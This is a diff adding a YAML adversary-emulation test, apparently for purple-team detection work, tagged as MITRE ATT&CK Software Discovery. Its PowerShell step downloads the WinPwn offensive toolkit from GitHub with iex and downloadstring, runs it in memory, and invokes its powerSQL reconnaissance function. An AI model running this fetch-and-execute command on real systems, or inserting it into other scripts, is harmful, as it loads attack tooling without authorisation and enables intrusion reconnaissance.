@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - powerSQL
+description: Start PowerUpSQL Checks using powerSQL function of WinPwn
+uuid: 0bb64470-582a-4155-bde2-d6003a95ed34
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1518: Software Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powersql
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        powerSQL -noninteractive -consoleoutput
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
